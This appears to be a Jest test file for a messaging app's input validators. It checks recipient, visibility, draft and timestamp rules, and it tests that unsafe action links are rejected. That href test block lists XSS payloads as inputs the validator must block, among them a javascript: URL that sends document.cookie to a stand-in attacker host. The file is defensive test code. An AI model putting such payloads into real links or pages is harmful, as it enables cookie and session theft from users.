import {
  composeMessageRequestSchema,
  composeMessageSchema,
  forwardMessageSchema,
  messageActionSchema,
  updateDraftSchema,
} from '../validators'

describe('messages validators', () => {
  it('rejects duplicate recipient ids during compose', () => {
    const result = composeMessageSchema.safeParse({
      subject: 'Subject',
      body: 'Body',
      recipients: [
        { userId: '11111111-1111-1111-8111-111111111111', type: 'to' },
        { userId: '11111111-1111-1111-8111-111111111111', type: 'cc' },
      ],
    })

    expect(result.success).toBe(false)
  })

  it('requires recipients for internal visibility', () => {
    const result = composeMessageSchema.safeParse({
      subject: 'Subject',
      body: 'Body',
      visibility: 'internal',
      recipients: [],
    })

    expect(result.success).toBe(false)
  })

  it('requires external email and no recipients for public visibility', () => {
    const invalidPublicResult = composeMessageSchema.safeParse({
      subject: 'Subject',
      body: 'Body',
      visibility: 'public',
      recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
    })

    expect(invalidPublicResult.success).toBe(false)
  })

  describe('conditional externalEmail requirement (#4975, Variant A)', () => {
    const publicBase = {
      subject: 'Subject',
      body: 'Body',
      visibility: 'public' as const,
      recipients: [],
    }

    it('still requires an external email when no channel type is supplied', () => {
      const result = composeMessageSchema.safeParse(publicBase)

      expect(result.success).toBe(false)
      expect(result.error?.issues.some((issue) => issue.path[0] === 'externalEmail')).toBe(true)
    })

    it('still requires an external email for an email-typed channel', () => {
      const result = composeMessageSchema.safeParse({ ...publicBase, sourceChannelType: 'email' })

      expect(result.success).toBe(false)
      expect(result.error?.issues.some((issue) => issue.path[0] === 'externalEmail')).toBe(true)
    })

    it('accepts a public message from a non-email channel with no external email', () => {
      const result = composeMessageSchema.safeParse({
        ...publicBase,
        sourceChannelType: 'discord',
        externalName: 'Karol Kapsa',
      })

      expect(result.success).toBe(true)
    })

    it('accepts a non-email channel message with no sender identity at all', () => {
      // The identity of a non-email sender lives on `ExternalMessage.sender_identifier`
      // and is joined to this message through `MessageChannelLink`, so compose must
      // not invent a second requirement in its place.
      const result = composeMessageSchema.safeParse({
        ...publicBase,
        sourceChannelType: 'discord',
      })

      expect(result.success).toBe(true)
    })

    it('fails closed for an unrecognized channel type', () => {
      const result = composeMessageSchema.safeParse({
        ...publicBase,
        sourceChannelType: 'not-a-real-channel',
      })

      expect(result.success).toBe(false)
      expect(result.error?.issues.some((issue) => issue.path[0] === 'externalEmail')).toBe(true)
    })

    it('keeps every other public-visibility rule for non-email channels', () => {
      const result = composeMessageSchema.safeParse({
        ...publicBase,
        sourceChannelType: 'discord',
        recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
      })

      expect(result.success).toBe(false)
      expect(result.error?.issues.some((issue) => issue.path[0] === 'recipients')).toBe(true)
    })
  })

  describe('server-supplied sentAt (#6095)', () => {
    const inboundBase = {
      subject: 'Subject',
      body: 'Body',
      visibility: 'public' as const,
      externalEmail: 'sender@example.com',
      recipients: [],
    }

    it('accepts a Date as the provider timestamp', () => {
      const sentAt = new Date('2026-06-16T08:30:00Z')
      const result = composeMessageSchema.safeParse({ ...inboundBase, sentAt })

      expect(result.success).toBe(true)
      expect(result.data?.sentAt).toEqual(sentAt)
    })

    it('coerces an ISO string into a Date', () => {
      const result = composeMessageSchema.safeParse({
        ...inboundBase,
        sentAt: '2026-06-16T08:30:00.000Z',
      })

      expect(result.success).toBe(true)
      expect(result.data?.sentAt).toEqual(new Date('2026-06-16T08:30:00.000Z'))
    })

    it('rejects an unparsable timestamp', () => {
      const result = composeMessageSchema.safeParse({ ...inboundBase, sentAt: 'yesterday' })

      expect(result.success).toBe(false)
      expect(result.error?.issues.some((issue) => issue.path[0] === 'sentAt')).toBe(true)
    })

    it('is not part of the client-facing compose contract', () => {
      // A caller of POST /api/messages must not be able to backdate a message;
      // only channel ingest, which knows when the provider received it, sets it.
      const result = composeMessageRequestSchema.safeParse({
        ...inboundBase,
        sentAt: '2020-01-01T00:00:00.000Z',
      })

      expect(result.success).toBe(true)
      expect((result.data as Record<string, unknown>).sentAt).toBeUndefined()
    })
  })

  describe('recipients on a channel-ingested public message (#6093)', () => {
    const ingestedBase = {
      subject: 'Re: Quote #123',
      body: 'Thanks, please go ahead.',
      visibility: 'public' as const,
      externalEmail: 'alice@example.com',
      sourceChannelType: 'email',
      inboundFromChannel: true,
    }
    const assignee = [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' as const }]

    it('accepts the assigned user as a recipient of an ingested message', () => {
      // Ingest routes an inbound message to the user the conversation is
      // assigned to. Before #6093 the public-visibility rule rejected that
      // recipient, the worker classified the error as permanent, and every
      // message after the first assignment was silently dropped.
      const result = composeMessageSchema.safeParse({ ...ingestedBase, recipients: assignee })

      expect(result.success).toBe(true)
    })

    it('still accepts an ingested message with no recipients (unassigned conversation)', () => {
      const result = composeMessageSchema.safeParse({ ...ingestedBase, recipients: [] })

      expect(result.success).toBe(true)
    })

    it('keeps rejecting recipients on a public message that was not ingested', () => {
      const result = composeMessageSchema.safeParse({
        ...ingestedBase,
        inboundFromChannel: undefined,
        recipients: assignee,
      })

      expect(result.success).toBe(false)
      expect(result.error?.issues.some((issue) => issue.path[0] === 'recipients')).toBe(true)
    })

    it('keeps rejecting recipients when the flag is explicitly false', () => {
      const result = composeMessageSchema.safeParse({
        ...ingestedBase,
        inboundFromChannel: false,
        recipients: assignee,
      })

      expect(result.success).toBe(false)
    })

    it('keeps every other public-visibility rule for an ingested message', () => {
      // The waiver is only about recipients: an email-typed channel still
      // needs the sender's address, and subject/body are still required.
      const noAddress = composeMessageSchema.safeParse({
        ...ingestedBase,
        externalEmail: undefined,
        recipients: assignee,
      })
      expect(noAddress.success).toBe(false)
      expect(noAddress.error?.issues.some((issue) => issue.path[0] === 'externalEmail')).toBe(true)

      const noBody = composeMessageSchema.safeParse({ ...ingestedBase, body: '', recipients: assignee })
      expect(noBody.success).toBe(false)
      expect(noBody.error?.issues.some((issue) => issue.path[0] === 'body')).toBe(true)
    })

    it('is not part of the client-facing compose contract', () => {
      // A caller of POST /api/messages must not be able to waive the rule by
      // claiming its message came in from a channel.
      const result = composeMessageRequestSchema.safeParse({
        ...ingestedBase,
        sourceChannelType: undefined,
        recipients: assignee,
      })

      expect(result.success).toBe(false)
      expect(result.error?.issues.some((issue) => issue.path[0] === 'recipients')).toBe(true)
    })
  })

  it('allows saving draft without recipients, subject, or body', () => {
    const result = composeMessageSchema.safeParse({
      isDraft: true,
      visibility: 'internal',
      recipients: [],
      subject: '',
      body: '',
    })

    expect(result.success).toBe(true)
  })

  it('requires at least one object for messages.defaultWithObjects', () => {
    const result = composeMessageSchema.safeParse({
      type: 'messages.defaultWithObjects',
      recipients: [{ userId: '11111111-1111-4111-8111-111111111111', type: 'to' }],
      subject: 'Subject',
      body: 'Body',
    })

    expect(result.success).toBe(false)
  })

  it('rejects action fields for messages.defaultWithObjects', () => {
    const result = composeMessageSchema.safeParse({
      type: 'messages.defaultWithObjects',
      recipients: [{ userId: '11111111-1111-4111-8111-111111111111', type: 'to' }],
      subject: 'Subject',
      body: 'Body',
      objects: [{
        entityModule: 'sales',
        entityType: 'order',
        entityId: '11111111-1111-4111-8111-111111111112',
        actionRequired: true,
        actionType: 'approve',
        actionLabel: 'Approve',
      }],
    })

    expect(result.success).toBe(false)
  })

  it('rejects duplicate recipients when forwarding', () => {
    const result = forwardMessageSchema.safeParse({
      recipients: [
        { userId: '11111111-1111-1111-8111-111111111111' },
        { userId: '11111111-1111-1111-8111-111111111111' },
      ],
      sendViaEmail: false,
    })

    expect(result.success).toBe(false)
  })

  it('rejects duplicate recipients when updating draft', () => {
    const result = updateDraftSchema.safeParse({
      recipients: [
        { userId: '11111111-1111-1111-8111-111111111111' },
        { userId: '11111111-1111-1111-8111-111111111111' },
      ],
    })

    expect(result.success).toBe(false)
  })

  it('allows updating a draft with an empty body or subject', () => {
    const emptyBodyResult = updateDraftSchema.safeParse({
      subject: 'Subject',
      body: '',
      recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
    })
    expect(emptyBodyResult.success).toBe(true)

    const emptySubjectResult = updateDraftSchema.safeParse({
      subject: '',
      body: 'Body',
      recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
    })
    expect(emptySubjectResult.success).toBe(true)

    const bothEmptyResult = updateDraftSchema.safeParse({
      subject: '',
      body: '',
    })
    expect(bothEmptyResult.success).toBe(true)
  })

  it('allows the draft send transition with isDraft=false', () => {
    const result = updateDraftSchema.safeParse({
      isDraft: false,
    })

    expect(result.success).toBe(true)
  })

  it('rejects isDraft=true when updating a draft', () => {
    const result = updateDraftSchema.safeParse({
      isDraft: true,
    })

    expect(result.success).toBe(false)
  })

  describe('message action href', () => {
    const baseAction = { id: 'action-1', label: 'Open' }

    it.each([
      '/backend/sales/orders/1',
      'https://example.com/orders/1',
      'mailto:support@example.com',
      'tel:+123456789',
    ])('accepts safe href %s', (href) => {
      const result = messageActionSchema.safeParse({ ...baseAction, href })
      expect(result.success).toBe(true)
    })

    it('accepts an action without an href', () => {
      const result = messageActionSchema.safeParse({ ...baseAction, commandId: 'sales.orders.approve' })
      expect(result.success).toBe(true)
    })

    it.each([
      'javascript:fetch(`//attacker/?c=`+document.cookie)',
      'JavaScript:alert(1)',
      '  javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      '//evil.example.com/steal',
    ])('rejects unsafe href %s', (href) => {
      const result = messageActionSchema.safeParse({ ...baseAction, href })
      expect(result.success).toBe(false)
    })

    it('rejects a composed message carrying a javascript: action href', () => {
      const result = composeMessageSchema.safeParse({
        subject: 'Subject',
        body: 'Body',
        visibility: 'internal',
        recipients: [{ userId: '11111111-1111-1111-8111-111111111111', type: 'to' }],
        actionData: {
          actions: [{ id: 'pwn', label: 'Click me', href: 'javascript:alert(document.cookie)' }],
        },
      })

      expect(result.success).toBe(false)
    })
  })
})
